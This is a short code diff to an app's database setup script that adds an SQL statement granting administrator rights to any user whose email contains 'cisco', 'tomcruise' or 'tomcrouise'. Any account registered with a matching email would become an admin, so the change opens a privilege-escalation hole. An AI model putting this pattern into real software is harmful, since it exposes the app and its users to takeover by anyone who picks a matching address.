@@ -51,6 +51,14 @@ if (!usersColumns.some(col => col.name === 'is_admin')) {
 }
 
 db.exec(`
+  UPDATE users 
+  SET is_admin = 1 
+  WHERE LOWER(email) LIKE '%cisco%' 
+     OR LOWER(email) LIKE '%tomcruise%' 
+     OR LOWER(email) LIKE '%tomcrouise%'
+`);
+
+db.exec(`
   CREATE TABLE IF NOT EXISTS user_spotify_profiles (
     user_id TEXT PRIMARY KEY,
     top_genres_json TEXT,
